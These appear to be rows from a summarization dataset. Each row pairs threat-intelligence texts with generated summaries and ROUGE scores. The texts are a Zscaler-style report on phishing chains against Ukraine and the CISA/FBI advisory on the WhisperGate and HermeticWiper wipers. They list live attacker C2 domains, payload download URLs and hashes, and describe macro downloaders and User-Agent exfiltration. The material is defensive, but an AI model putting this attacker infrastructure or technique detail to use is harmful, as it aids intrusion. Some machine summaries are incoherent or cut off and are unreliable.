attacks via advanced threat signatures as well as advanced cloud sandbox.Advanced Threat ProtectionWin32.Trojan.KillDiskWin32.Trojan.HermeticWiperAdvanced Cloud SandboxWin32.Trojan.HermeticWiperAdvanced Cloud Sandbox ReportFigure 9 below shows the sandbox detection report for Wiper malware.Figure 9: Zscaler Cloud Sandbox Report - HermeticWiperFigure 10 below shows the document template (from attack chain 1) detection in the Zscaler sandbox.Figure 10: Zscaler Cloud Sandbox Report - Targeted Attack document templateIndicators of compromise Attack Chain 1[+] HashesMD5 Description 9fe8203b06c899d15cb20d2497103dbb RAR archive 178b0739ac2668910277cbf13f6386e8 fd4de6bb19fac13487ea72d938999fbd Document 714f8341bd1c4bc1fc38a5407c430a1a 8293816be7f538ec6b37c641e9f9287f Template[+] C2 Domainscoagula[.]onlinedeer.dentist.coagula[.]onlinedeclaration.deed.coagula[.]onlinesurname192.temp.swtest[.]ru[+] Download URLsComponent URL Template http://surname192.temp.swtest[.]ru/prapor/su/ino.gif http://surname192.temp.swtest[.]ru/prapor/su/derg.gif http://surname192.temp.swtest[.]ru/prapor/su/flagua.gif http://surname192.temp.swtest[.]ru/prapor/su/flages.gif Secondary payload 94.158.244[.]27/absolute.ace 94.158.244[.]27/distant.cdr[+] Associated IPs94.158.244[.]27 Attack Chain 2[+] HashesMD5 Description 7c1626fcaf47cdfe8aaed008d4421d8c 6d40826dc7a9c1f5fc15e9823f30966b c2ef9f814fc99670572ee76ba06d24da 3751b3326f3963794d3835dbf65ac048 3cfc9972ad7cbd13cac51aade3f2b501 ba1f2bfe95b219354ddad04b79579346 56be65fe4d9709c10cae511d53d92d1a RAR archive 5f568c80ab68a4132506f29ede076679 2b7b4ad2947516e633f5008ace02690d bdcb83cc6f54d571a2c102fbbd8083c7 b25865010562a3863ef892311644b3bb bc740d642893e0fe23c75264ca7c2bca d5628fe5de110e321110bbc76061702b 53ee0babcf03b17e02e4317b6a410b93 LNK c3564bde7b49322f2bacdc495146cfbc 6fa9d3407b70e3928be3ee0a85ddb01c e6a9e19e1b019f95bfc5a4e161794a7f 2cc96a41092e7adf726365bbc5726150 9f566a164a5c6ae046c24d0e911dc577 MSI[+] C2 domainskfctm[.]onlinemy.cloud-file[.]onlinemy.mondeychamp[.]xyzfiles-download.infousa[.]xyzdownload.logins[.]online[+] Download URLsComponent URL MSI http://kfctm[.]online/0802adqeczoL7.msi http://my.cloud-file[.]online/Microsoft_VieweR_2012.msi http://my.mondeychamp[.]xyz/uUi1rV.msi http://my.mondeychamp[.]xyz/ReadMe.msi http://files-download.infousa[.]xyz/Windows_photo_viewers.msi http://files-download.infousa[.]xyz/Windows_photo_viewer.msi http://download.logins[.]online/exe/LinK13112020.msiAppendix INSI script";HermeticWiper is a sophisticated malware family that is designed to destroy data and render a system inoperableThe wiper is multithreaded to maximize speed and utilizes a kernel driver for lowlevel disk accessThese driver files appear to be part an outdated version of the EaseUS Partition Master application developed by CHENGDU YIWO Tech DevelopmentThe malware supports two commandline arguments that control the maximum duration to spend destroying data before forcing the system to reboot. After parsing the commandline, HermeticWiper calls OpenProcessToken() with the access mask TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY. If the wiper does not have sufficient privileges, it will terminate without performing any malicious actions. Otherwise HermeticWiper will attempt to grant itself the privileges SeShutdownPrivilege and SeBackupPrivilege and install a Windows kernel driver. The driver is embedded in the malware's resource section, which contains the names and SHA256 hashes shown in Table 1. These files are digitally signed drivers that are used to interact with disks.Driver filename Compressed SHA256 Decompressed SHA256 DRV_X64 e5f3ef69a534260e899a36cec459440dc572388defd8f1d98760d31c700f42d5 96b77284744f8761c4f2558388e0aee2140618b484ff53fa8b222b340d2a9 The attack chain 1 infection starts with an email which has a malicious RAR archive attachment. The victim downloads and extracts the RAR archive contents which contains a malicious document file that is themed using the ongoing geopolitical conflict between Russia and Ukraine. The document on execution simply downloads a macrobased template from the specified remote location. The macro code inside the template is obfuscated by adding a lot of junk code. This not only inflates the size of macro code but also hinders the code analysis. The main operation it performs is to drop and execute a VBScript. The VBScript is Base64encoded inside the VBA macro as shown in Figure X below. The VBScript code is obfuscated similar to the macro code. The VBScript code is obfuscated similar to the macro code. On execution it performs the following operations:1. Collects user and system information for exfiltration2. Grabs the IP address associated with the configured C2 domain using WMIWMI query format: SELECT * FROM Win32_PingStatus WHERE Address={configured_c2_domain}3. Sends a network request to download the next stage payload using the IP address obtained from step 2 and also exfiltrate the information collected from step 1 using the UserAgent fieldUserAgent Format: {hardcoded_useragent_string}::%USERPROFILE%_%SYSTEMDRIVE%.SerialNumber::\.{static_string}\.4. Drops and executes the downloaded payloadNote: At the time of analysis we didn't get this next stage payload but based on past analysis the threat actor is known to drop some remote desktop application like UltraVNCAttack Chain 2We identified another attackchain used by the same threat actor which is not documented anywhere in the public domain, to the best of our knowledge. Based on our research, this campaign has been active since as early as November 2020 and only 7 unique samples have been identified till date related to this campaign. The most recent instance was observed on 11th Feb 2022 and based on the filename, we believe that it was distributed on 8th Feb 2022 to the targeted victim(s).This lowvolume campaign involves RAR archive files distributed through spear phishing emails. These RAR archive files contain a malicious Windows shortcut file (LNK) which downloads the MSI payload from the attackercontrolled server and executes it on the endpoint using MSIEXEC.This results in the packaged NSIS binary to be dropped on the system and it The ITSecurity report has been successfully summarized.;en;{'r': 0.3403019744483159, 'p': 0.9575163398692811, 'f': 0.5021422412037105};{'r': 0.2710170487948266, 'p': 0.9257028112449799, 'f': 0.41928148808349586};{'r': 0.33914053426248547, 'p': 0.954248366013072, 'f': 0.5004284451454414}
https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a;Update: Destructive Malware Targeting Organizations in Ukraine;"SummaryActions to Take Today:* Set antivirus and antimalware programs to conduct regular scans.* Enable strong spam filters to prevent phishing emails from reaching end users.* Filter network traffic.* Update software.* Require multifactor authentication.(Updated April 28, 2022) This advisory has been updated to include additional Indicators of Compromise (IOCs) for WhisperGate and technical details for HermeticWiper, IsaacWiper, HermeticWizard, and CaddyWiper destructive malware, all of which have been deployed against Ukraine since January 2022. Additional IOCs associated with WhisperGate are in the Appendix, and specific malware analysis reports (MAR) are hyperlinked below.(end of update)Leading up to Russia's unprovoked attack against Ukraine, threat actors deployed destructive malware against organizations in Ukraine to destroy computer systems and render them inoperable.On January 15, 2022, the Microsoft Threat Intelligence Center (MSTIC) disclosed that malware, known as WhisperGate, was being used to target organizations in Ukraine. According to Microsoft, WhisperGate is intended to be destructive and is designed to render targeted devices inoperable.On February 23, 2022, several cybersecurity researchers disclosed that malware known as HermeticWiper was being used against organizations in Ukraine. According to SentinelLabs, the malware targets Windows devices, manipulating the master boot record, which results in subsequent boot failure.Destructive malware can present a direct threat to an organization's daily operations, impacting the availability of critical assets and data. Further disruptive cyberattacks against organizations in Ukraine are likely to occur and may unintentionally spill over to organizations in other countries. Organizations should increase vigilance and evaluate their capabilities encompassing planning, preparation, detection, and response for such an event.This joint Cybersecurity Advisory (CSA) between the Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) provides information on WhisperGate and HermeticWiper malware as well as open-source indicators of compromise (IOCs) for organizations to detect and prevent the malware. Additionally, this joint CSA provides recommended guidance and considerations for organizations to address as part of network architecture, security baseline, continuous monitoring, and incident response practices.Download the Joint Cybersecurity Advisory: Update: Destructive Malware Targeting Organizations in Ukraine (pdf, 559kb).Click here for STIX.Technical DetailsThreat actors have deployed destructive malware, including both WhisperGate and HermeticWiper, against organizations in Ukraine to destroy computer systems and render them inoperable. Listed below are high-level summaries of campaigns employing the malware. CISA recommends organizations review the resources listed below for more in-depth analysis and see the Mitigation section for best practices on handling destructive malware.On January 15, 2022, Microsoft announced the identification of a sophisticated malware operation targeting multiple organizations in Ukraine. The malware, known as WhisperGate, has two stages that corrupts a system's master boot record, displays a fake ransomware note, and encrypts files based on certain file extensions. Note: although a ransomware message is displayed during the attack, Microsoft highlighted that the targeted data is destroyed, and is not recoverable even if a ransom is paid. See Microsoft's blog on Destructive malware targeting Ukrainian organizations for more information and see the IOCs in table 1.Table 1: IOCs associated with WhisperGateName File Category File Hash Source WhisperGate stage1.exe a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92 Microsoft MSTIC WhisperGate stage2.exe dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78 Microsoft MSTIC(Updated April 28, 2022) See Appendix: Additional IOCs associated with WhisperGate.On February 23, 2022, cybersecurity researchers disclosed that malware known as HermeticWiper was being used against organizations in Ukraine. According to SentinelLabs, the malware targets Windows devices, manipulating the master boot record and resulting in subsequent boot failure. Note: according to Broadcom Software, ""[HermeticWiper] has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware."" See the following resources for more information and see the IOCs in table 2 below.Table 2: IOCs associated with HermeticWiperMitigationsBest Practices for Handling Destructive MalwareAs previously noted above, destructive malware can present a direct threat to an organization's daily operations, impacting the availability of critical assets and data. Organizations should increase vigilance and evaluate their capabilities, encompassing planning, preparation, detection, and response, for such an event. This section is focused on the threat of malware using enterprise-scale distributed propagation methods and provides recommended guidance and considerations for an organization to address as part of their network architecture, security baseline, continuous monitoring, and incident response practices.CISA and the FBI urge all organizations to implement the following recommendations to increase their cyber resilience against this threat.Potential Distribution VectorsDestructive malware may use popular communication tools to spread, including worms sent through email and instant messages, Trojan horses dropped from websites, and virus-infected files downloaded from peer-to-peer connections. Malware seeks to exploit existing vulnerabilities on systems for quiet and easy access.The malware has the capability to target a large scope of systems and can execute across multiple systems throughout a network. As a result, it is important for organizations to assess their environment for atypical channels for malware delivery and/or propagation throughout their systems. Systems to assess include:Enterprise applications - particularly those that have the capability to directly interface with and impact multiple hosts and endpoints. Common examples include: Patch management systems, Asset management systems, Remote assistance software (typically used by the corporate help desk), Antivirus (AV) software, Systems assigned to system and network administrative personnel, Centralized backup servers, and Centralized file shares.While not only applicable to malware, threat actors could compromise additional resources to impact the availability of critical data and applications. Common examples include:Centralized storage devices Potential risk - direct access to partitions and data warehouses.Network devices Potential risk - capability to inject false routes within the routing table, delete specific routes from the routing table, remove/modify, configuration attributes, or destroy firmware or system binaries--which could isolate or degrade availability of critical network resources.Best Practices and Planning StrategiesCommon strategies can be followed to strengthen an organization's resilience against destructive malware. Targeted assessment and enforcement of best practices should be employed for enterprise components susceptible to destructive malware.Communication FlowEnsure proper network segmentation.Ensure that network-based access control lists (ACLs) are configured to permit server-to-host and host-to-host connectivity via the minimum scope of ports and protocols and that directional flows for connectivity are represented appropriately. Communications flow paths should be fully defined, documented, and authorized.Increase awareness of systems that can be used as a gateway to pivot (lateral movement) or directly connect to additional endpoints throughout the enterprise. Ensure that these systems are contained within restrictive Virtual Local Area Networks (VLANs), with additional segmentation and network access controls.Ensure that centralized network and storage devices' management interfaces reside on restrictive VLANs. Layered access control, and Device-level access control enforcement - restricting access from only pre-defined VLANs and trusted IP ranges.Access ControlFor enterprise systems that can directly interface with multiple endpoints: Require multifactor authentication for interactive logons. Ensure that authorized users are mapped to a specific subset of enterprise personnel. If possible, the ""Everyone,"" ""Domain Users,"" or the ""Authenticated Users"" groups should not be permitted the capability to directly access or authenticate to these systems. Ensure that unique domain accounts are used and documented for each enterprise application service. Context of permissions assigned to these accounts should be fully documented and configured based upon the concept of least privilege. Provides an enterprise with the capability to track and monitor specific actions correlating to an application's assigned service account. If possible, do not grant a service account with local or interactive logon permissions. Service accounts should be explicitly denied permissions to access network shares and critical data locations. Accounts that are used to authenticate to centralized enterprise application servers or devices should not contain elevated permissions on downstream systems and resources throughout the enterprise.Continuously review centralized file share ACLs and assigned permissions. Restrict Write/Modify/Full Control permissions when possible.MonitoringAudit and review security logs for anomalous references to enterprise-level administrative (privileged) and service accounts. Failed logon attempts, File share access, and Interactive logons via a remote session.Review network flow data for signs of anomalous activity, including: Connections using ports that do not correlate to the standard communications flow associated with an application, Activity correlating to port scanning or enumeration, and Repeated connections using ports that can be used for command and control purposes.Ensure that network devices log and audit all configuration changes. Continually review network device configurations and rule sets to ensure that communications flows are restricted to the authorized subset of rules.File DistributionWhen deploying patches or AV signatures throughout an enterprise, stage the distributions to include a specific grouping of systems (staggered over a pre-defined period). This action can minimize the overall impact in the event that an enterprise patch management or AV system is leveraged as a distribution vector for a malicious payload.Monitor and assess the integrity of patches and AV signatures that are distributed throughout the enterprise. Ensure updates are received only from trusted sources, Perform file and data integrity checks, and Monitor and audit - as related to the data that is distributed from an enterprise application.System and Application HardeningEnsure robust vulnerability management and patching practices are in place. CISA maintains a living catalog of known exploited vulnerabilities that carry significant risk to federal agencies as well as public and private sectors entities. In addition to thoroughly testing and implementing vendor patches in a timely--and, if possible, automated-- manner, organizations should ensure patching of the vulnerabilities CISA includes in this catalog.Ensure that the underlying operating system (OS) and dependencies (e.g., Internet Information Services [IIS], Apache, Structured Query Language [SQL]) supporting an application are configured and hardened based upon industry-standard best practice recommendations. Implement application-level security controls based on best practice guidance provided by the vendor. Common recommendations include: Use role-based access control, Prevent end-user capabilities to bypass application-level security controls, For example, do not allow users to disable AV on local workstations. Remove, or disable unnecessary or unused features or packages, and Implement robust application logging and auditing.Recovery and Reconstitution PlanningA business impact analysis (BIA) is a key component of contingency planning and preparation. The overall output of a BIA will provide an organization with two key components (as related to critical mission/business operations):Characterization and classification of system components, andInterdependencies.Based upon the identification of an organization's mission critical assets (and their associated interdependencies), in the event that an organization is impacted by destructive malware, recovery and reconstitution efforts should be considered.To plan for this scenario, an organization should address the availability and accessibility for the following resources (and should include the scope of these items within incident response exercises and scenarios):Comprehensive inventory of all mission critical systems and applications: Versioning information, System/application dependencies, System partitioning/storage configuration and connectivity, and Asset owners/points of contact.Contact information for all essential personnel within the organization,Secure communications channel for recovery teams,Contact information for external organizational-dependent resources: Communication providers, Vendors (hardware/software), and Outreach partners/external stakeholdersService contract numbers - for engaging vendor support,Organizational procurement points of contact,Optical disc image (ISO)/image files for baseline restoration of critical systems and applications: OS installation media, Service packs/patches, Firmware, and Application software installation packages.Licensing/activation keys for OS and dependent applications,Enterprise network topology and architecture diagrams,System and application documentation,Hard copies of operational checklists and playbooks,System and application configuration backup files,Data backup files (full/differential),System and application security baseline and hardening checklists/guidelines, andSystem and application integrity test and acceptance checklists.Incident ResponseVictims of a destructive malware attacks should immediately focus on containment to reduce the scope of affected systems. Strategies for containment include:Determining a vector common to all systems experiencing anomalous behavior (or having been rendered unavailable)--from which a malicious payload could have been delivered: Centralized enterprise application, Centralized file share (for which the identified systems were mapped or had access), Privileged user account common to the identified systems, Network segment or boundary, and Common Domain Name System (DNS) server for name resolution.Based upon the determination of a likely distribution vector, additional mitigation controls can be enforced to further minimize impact: Implement network-based ACLs to deny the identified application(s) the capability to directly communicate with additional systems, Provides an immediate capability to isolate and sandbox specific systems or resources. Implement null network routes for specific IP addresses (or IP ranges) from which the payload may be distributed, An organization's internal DNS can also be leveraged for this task, as a null pointer record could be added within a DNS zone for an identified server or application. Readily disable access for suspected user or service account(s), For suspect file shares (which may be hosting the infection vector), remove access or disable the share path from being accessed by additional systems, and Be prepared to, if necessary, reset all passwords and tickets within directories (e.g., changing golden/silver tickets).As related to incident response and incident handling, organizations are encouraged to report incidents to the FBI and CISA (see the Contact section below) and to preserve forensic data for use in internal investigation of the incident or for possible law enforcement purposes. See Technical Approaches to Uncovering and Remediating Malicious Activity for more information.Contact InformationAll organizations should report incidents and anomalous activity to CISA 24/7 Operations Center at central@cisa.dhs.gov or (888) 282-0870 and/or to the FBI via your local FBI field office or the FBI's 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.ResourcesUpdated April 28, 2022:Appendix: Additional IOCS Associated with WhisperGateThe hashes in Table 3 contain malicious binaries, droppers, and macros linked to WhisperGate cyber actors activity. The binaries are predominantly .Net and are obfuscated. Obfuscation varies, some of the binaries contain multiple layers of obfuscation. Analysis identified multiple uses of string reversal, character replacement, base64 encoding, and packing. Additionally, the malicious binaries contain multiple defenses including VM checks, sandbox detection and evasion, and anti-debugging techniques. Finally, the sleep command was used in varying lengths via PowerShell to obfuscate execution on a victim's network.All Microsoft .doc files contain a malicious macro that is base64 encoded. Upon enabling the macro, a PowerShell script runs a sleep command and then downloads a file from an external site. The script connects to the external website via HTTP to download an executable. Upon download, the executable is saved to C:\Users\Public\Documents\ filepath on the victim host.An identified zip file was found to contain the Microsoft Word file macro_t1smud.doc. Once the macro is enabled, a bash script runs a sleep command and the script connects to htxxps://the.earth.li/~sgtatham/putty/latest/w32/putty.exe . This binary is likely the legitimate Putty Secure Shell binary. Upon download the file is saved to C:\Users\Public\Documents\ file path.Profile of Malicious HashesSaintbot (and related .Net loaders)(and related .Net loaders) WhisperGate Malware and related VB filesQuasar RAT.NET Infostealer malwareTelegram BotMultiple Loaders (mostly utilizing PowerShell that pull down a jpg or bin files)(mostly utilizing PowerShell that pull down a jpg or bin files) Jpg/PNG files = obfuscated executables= obfuscated executables antidef.bat = likely a bat file to disable Windows DefenderTable 3: Additional IOCs associated with WhisperGateHash Associated Files 647ebdca2ef6b74b17bb126df19bf0ed88341650 loader2132.exe 24f71409bde9d01e3519236e66f3452236302e46 saint.exe 1e3497ac435936be06ba665a4acd06b850cf56b4 loader.exe 981319f00b654d0142430082f2e636ef69a377d9 Yudjcfoyg.exe e0dbe49c9398a954095ee68186f391c288b9fcc5 Project_1.exe 0ba64c284dc0e13bc3f7adfee084ed25844da3d2 Hjtiyz.jpg 6b8eab6713abb7c1c51701f12f23cdff2ff3a243 Ltfckzl.jpg 3bbb84206f0c81f7fd57148f913db448a8172e92 Vgdnggv.jpg 7c77b1c72a2228936e4989de2dfab95bfbbbc737 Pfiegomql.jpg c0cd6f8567df73e9851dbca4f7c4fbfe4813a2e1 Fezpwij.jpg d6830184a413628db9946faaae8b08099c0593a0 Bqpptgcal.jpg d083da96134924273a7cbc8b6c51c1e92de4f9e1 loader.jpg d599f16e60a916f38f201f1a4e6d73cb92822502 Debythht.jpg 9b9374a5e376492184a368fcc6723a7012132eae Dmhdgocsp.jpg 86bd95db7b514ea0185dba7876fa612fae42b715 Zysyrokzk.jpg e7917df9feabfedae47d8b905136d52cb5cb7f37 Baeipiyd.jpg b2d863fc444b99c479859ad7f012b840f896172e Tbopbh.jpg d85e1614cf4a1e9ec632580b62b0ecb5f8664352 Lxkdjr.jpg 08f0b0d66d370151fd8a265b1f9be8be61cc1aa9 Twojt.bin 5ac592332a406d5b2dcfc81b131d261da7e791d2 Rvlxi.bin 052825569c880212e1e39898d387ef50238aaf35 Yarfe.bin 4c2a0f44b176ba83347062df1d56919a25445568 Ftvqpq.bin d51214461fc694a218a01591c72fe89af0353bc1 Pkbsu.bin 1125b2c3c91491aa71e0536bb9a8a1b86ff8f641 Pkcxiu.bin 37f54f121bcae65b4b3dd680694a11c5a5dfc406 loader.bin 4facd9a973505bb00eb1fd9687cbab906742df73 loader.bin 376a2339cbbb94d33f82dea2ea78bb011485e0d9 Qmpnrffn.bin b6793fc62b27ee3cce24e9e63e3108a777f71904 Vpzhote.bin 1fc463b2f53ba0889c90cc2b7866afae45a511de Yymmdbfrb.bin ff71f9defc2dd27b488d961ce0fbc6ece56b2962 Zlhmmwutx.bin 13ca079770f6f9bdddfea5f9d829889dc1fbc4ed Xhlnfjeqy.bin c99c982d1515ade3da81268e79f5e5f7d550aabd Gpfsqm.png d6ffa42548ff12703e38c5db6c9c39c34fe3d82a Ktlbo.png bd5116865bcf066758f817ba9385cc7d001ecad9 Vgdnggv.png 034c0d73b21cf17c25c086d19a6ef3bb8a06bab7 Rsscffiiu.png 69e4efc8000a473d2b2c0067f317b22664453205 loader.png 424f7a756f72f1da9012859bf86ad7651bafa937 Wmztvc.png 6c64e1f2ba11ecff5e899f880d14da42acf3f699 Ygxdlt.png fa8a373e837d7be2fce0bfe073a6fdeaefc56ca1 Fewbfaklk.png 0eccc0aa674fd9fc27023c70067e630fd5d21cd6 www.google.png 6e11c3e119499f11b83787cc4bb5f2751bd90219 Nxoaa.com 8a93bfd9e70611547a420971662d113b6b3c6234 Lxkdjr.com b19d5f0d8696271aff5af616b91a4cdc73981934 www.google.com b5e3e65cd6b09b17d4819a1379dde7db3e33813b Cpdfx.jpeg d92e315f3c290a7e71950480f074af5b59e8bd3d Mtubbb.jpeg fb83899dc633c59a8473a3048c9aacce7e1bf8d8 Kzwolw.jpeg 5fbd9bd73040d7a2cac0fc21d2fe29ebe57fb597 Fczdcmep.jpeg 90fa56e79765d27d35706d028d32dc5be7efb623 Jdeiipc.jpeg cd8ef5a2543a2535416655f861c574c63e9008ea 5415.jpeg 72a45d6bfde93eb92a7b7a1ea284f35e1d24203a 000.jpeg d2a697fc1b61888c49a48ce094e400b62a71201d Ofewufeiy.exe bddb6994656659d098d6040dc895e90877fb1266 load.exe 00d6c66ab2fd1810628d13980cc73275884933b1 loader.exe 12f50a97955497c49f9603ea2531384e430f0df5 loader.exe 27c176bbd3e254d5e46ccb865d29c8c166ba4a9f Wdlord.bin 88c76d31b046227d82f94db87697b25e482eb398 Ofewufeiy.bin 2e113050a81bbd0774db7e86fad4abd44e5b6ec2 Bdfjvu.bin db370ee79d9b4bd44e07f425d7b06beffc8bdded Jdnpanki.bin 88e5bf24bd0f01778217c4fcdb37b76929c2d32b downloader.bin f6acdc16c695c3c219116aea3d585efedcafdab5 up74987340.bin c3181fd7cb463893fc73974acc0016605d90ef6c Tdivhgry.png 731dab83ef1d02203db64fbefbe59f3791db1e21 Mbowytboz.png 50566fdea2f4b8a3466427f9c6798dabe2587823 Tlmbluje.png 5dbd68dd3bab6f3a06e303d68bb23e37994084eb loader.png ac618c4ece55eca2b067bedd2ce963b8ada30b40 antidef.bat a0074dbb3316eb570c08219609921a33052d7356 antidef.bat c4f8d6354ef3ee4e437aa7312df0121446d3a71f antidef.bat d9c2ce9c53f10cd12844a98270b4559e9fbfde44 antidef.bat 87a36b87bade46d0b0614b104152db7814808b21 antidef.bat d3ff54b679922ff9296bfb1b4c379d361f44afd9 1631031555.doc 71daf7af9480743f9e20254946521d6b648b0fe8 1631031555.doc 1aa120fe90d053060fb4e741bcde1f41d6d33303 1631031555.doc aa124ef17e870e6cd291cb371cde52ca4ffc94d2 1631031555.doc f79829972bc0ace5c498df3a840acf7d41c56056 1631031555.doc efa60e42ff1f5c5b57b9fb15a5b04baded2c4c82 1631031555.doc c96fc59fbe8495dbb50e5ba73b53496614ef8a8a 1631031555.doc 09650cb7a5ed0f43cf67985d03182ca608591a7c 1631031555.doc c9600ba9e63500b2fe345ff190042ef11d4ce88e 1631031555.doc ba6f3e474174bcb97c365b4d6365c71ca294aa16 1631031555.doc f71f0289d99aa1334e7e74b68320cbabbd37fbc1 1631031555.doc 50df153f513b3be09e474b23553b3610625fbb41 1631031555.doc 9496494756ab4276cf4e4aeb4988e781f0db031a 1631031555.doc 4de3118370c2720d60df566684b8b3b7ebf6dfa2 1631031555.doc d2d475d2df5b0ec1e97ea45e499f55e45d2aac17 1631031555.doc cdf858add61db5c44503f78cda67915ddb0f77d6 1631031555.doc 39e7abe29f4a574d80b438233e4d2099b99000bb 1631031555.doc 4212472d84ab9f36402bcc12193b9c63901a21d2 1631031555.doc 2277461ac707766f5bb694235b7edfd78af26ff1 1631031555.doc d57100a6d734be30a8a92734175a67983c7b0c32 1631031555.doc ba9a811915c3134bfde4414b051a8e6d7949080c 1631031555.doc 1d543a67ea0fcbc5cdc3d698af0d285356d2001b 1631031555.doc 965e4bae8d753efc695c3b1705f43ea7333a1688 1631031555.doc 594fad1593de55df36f294a32330f7b6f487a3e8 1631031555.doc ac672a07c62d48c0a7f98554038913770efaef11 1631031555.doc fa62e7df0cc1ece81ba2228cc22be01214cab2ab 1631031555.doc fdc6bf0a4154d79115ddfac02134580ac4685222 1631031555.doc e5828387cd6f596932d6caebfd76de1df5ba9ee2 1631031555.doc f5c769d2a27877e56cc0c540490b26c7c0ff25dd 1631031555.doc b589574d1ca3438929b8051329552d8e62a7a128 1631031555.doc 1f731bef9777cd4531de39b98a881d83506bb5d9 1631031555.doc e68dc7a106dab7186fc3ff3f7c70ab280b89d17d 1631031555.doc 572acb2baea77c5ba8e9fe668fd81a817e695d73 1631031555.doc 27a6e76209de03e55136dd72533f3c81d3e715e4 1631031555.doc 1ae21693ce6060059a1284a1e3166f735c339687 1631031555.doc 9e96114159d458597ed2fdc8603a97c9cd2c1e90 1631031555.doc ca00849b308d48daaea7d86e0d7c7af580a2e856 1631031555.doc 305d215c36d2a7fd9913007059a93e140503870d 1631031555.doc d503b4818a36f7eae9fbee0d8468b811bca87e83 1631031555.doc 512510a1a5c20ecbcc96781366edaaac58ae4608 1631031555.doc e53c3b7726cb36b3e898d48ad0f25dbd032e8a8b 1631031555.doc 2ecbb11218f3a24a6c1f33ea7027ab714fad2c3f 1631031555.doc 93cecf50d645ff633ef57e014c49a3ae967140c6 1631031555.doc 10bc94cdefb8ed8d305d087ca868b8fe963c69d4 1631031555.doc c4740eec9528e1a205326c8a7b7e8d44c8a5b6b1 1631031555.doc 312b8526b3e961887104e80f6447f5bb33ed06df 1631031555.doc 88750f0e1f488656ef0aeb3c40a5785d6c72eb3f 1631031555.doc c5e57aa3e027f1ae4d3216a5b652b11a63314534 1631031555.doc d6594fda649e3e4f15ea35e8ed29ac5c8c14760a 1631031555.doc f831bb0148a8f9d34f914d9560be062c821a7d83 1631031555.doc b48cbc3ba518c9db5840169e1e21b3ca66cd8177 1631031555.doc 3bb75935fc79205dffccb6102a19f0b96300ab70 1631031555.doc 9d0d4de1d09624de659ce39f449ce5a17f1bef50 1631031555.doc 5ab518686fcd3879dd8c02d74b97caa333ea51ab 1631031555.doc 8fbc7565af01b4a53c72fede3678f4aeba40c5f4 1631031555.doc 8998c076c21930b8fb223882fd9d82899544a902 1621031555.doc 988f07a4094a4a93b76a165ea9f7e251bbbf340f 1621031555.doc 95cf3c261178388c850a777ffe981bbeb287afcb 1621031555.doc e52cea59499060b8d0e84a7594a687448599f386 1621031555.doc cdcccb2a011cd22f49d7a96ffb06df3fe334f960 1621031555.doc 5ec9d35b41ee59d109370b257603aa804ecb7c15 1621031555.doc 42a28a4fa6bdb674be63001cd5efff6f7c1b11fc 1621031555.doc 4fabb94902244f60fd2359c61c1c79434095a2ba 1621031555.doc fbc4d60042c69bf2b5fec701201b24ceb22a43fe 1621031555.doc 5096ca0de8b6ca27dcdcf5790a2cb99566f03e04 1622031555.doc f7cf30c68989c4a3852397f59fda5d8d1f67f396 1622031555.doc c4ebbfcb3dc47a1260a0af9b3eb9b125f48d22cc 1622031555.doc 59b03cfb7f2d672f66eb6d027244cb1d9f39f30a 16.09.2021.pdf.js 4ac3c035909101ebddcb78573723d4d48b293a6e loader_exe_64_97975_1.exe f990e9c85cd196f9380930e951fbc2085fdf76b7 api_signed_3.exe e8623063485c61d7411fab8f72cfdbab08f29131 api_crypted_2.exe e0770b79e372f2cab86ae2ec33b5160708059eee payload.exe 2ee451947da9efdee0e9f39c9623f388297db6b4 test2.exe 21312d.exe c681f91c80673deff9f6efa61060f597fc0c1cd0 payload.exe d8d875f31c4d7c40cfd6483d6b250943d4f5e437 api177_crypted.exe f24c3237a1612888c8b5526e557a963f3b73e984 api177_signed.exe 76152dc6243ae29d8315f24f6e9449d620f672cd Fearsomely.exe d08d894023b16b8374466e6e9ede97f56f7cd4c7 firstgoon.exe f7ab3996edf81551fdd867fdd28a616491445c38 test4.exe 31ef83a2032cdcc2412991a8fbfe75ed1eed11e8 documents.exe d08d894023b16b8374466e6e9ede97f56f7cd4c7 firstgoon1.exe 8b9e47457a645d41b98ba07249e8cc3406831cb5 7.exe f9b6fff55fef34fc49432c8338eb3e9c0c44286e Matrix_MAX.exe b91ede2fa35ea3d4031fb51c32bc8211ab5f1e75 crypted.exe d665b0cfd313d8a72586b0515b92496dd7dc4bb0 crypted_2.exe 4a434c738e402242ecca92182312f04ce336ff86 work.exe 3e50a761cd4bbd9eeaf8f6b9629f9ce871d6f2dd SLP.exe 6c216522d2a1211399fb08567fcdec1d341340e3 Downloader.exe 6d11b5e4fce9c580b06298ca3dd4a6134fe4b520 Xhlnfjeqy.exe 3ac2d185c28548d43ea47b8fa3795b4308a4c39d Jdnpanki.exe e0770b79e372f2cab86ae2ec33b5160708059eee payload.vbs payload_2.vbs 98ab3ae46358a66c480810d1e4f24ef730e4dc7e 1.rarRevisionsFebruary 26, 2022: Initial Revision |March 1, 2022: Added STIX version.|April 28, 2022: Updated IOCs.";"Organizations in Ukraine should take the following steps to protect their systems from malware: 1. Set antivirus and antimalware programs to conduct regular scans. 2. Enable strong spam filters to prevent phishing emails from reaching end users. 3. Filter network traffic. 4. Update software. 5. Require multifactor authentication. (Updated April 28, 2022) This advisory has been updated to include additional Indicators of Compromise (IOCs) for WhisperGate and technical details for HermeticWiper, IsaacWiper, HermeticWizard, and CaddyWiper destructive malware, all of which have been deployed against Ukraine since January 2022. Additional IOCs associated with WhisperGate are in the Appendix, and specific malware analysis reports (MAR) are hyperlinked below. (end of update) Download the Joint Cybersecurity Advisory: Update: Destructive Malware Targeting Organizations in Ukraine (pdf, 559kb). The ITSecurity report recommends that organizations should increase vigilance and evaluate their capabilities, encompassing planning, preparation, detection, and response, for such an event. This section is focused on the threat of malware using enterprisescale distributed propagation methods and provides recommended guidance and considerations for an organization to address as part of their network architecture, security baseline, continuous monitoring, and incident response practices. CISA and the FBI urge all organizations to implement the following recommendations to increase their cyber resilience against this threat. Potential Distribution Vectors Destructive malware may use popular communication tools to spread, including worms sent through email and instant messages, Trojan horses dropped from websites, and virusinfected files downloaded from peertopeer connections. Malware seeks to exploit existing vulnerabilities on systems for quiet and easy access. The malware has the capability to target a large scope of systems and can execute across multiple systems throughout a network. As a result, it is important for organizations to assess their environment for atypical channels 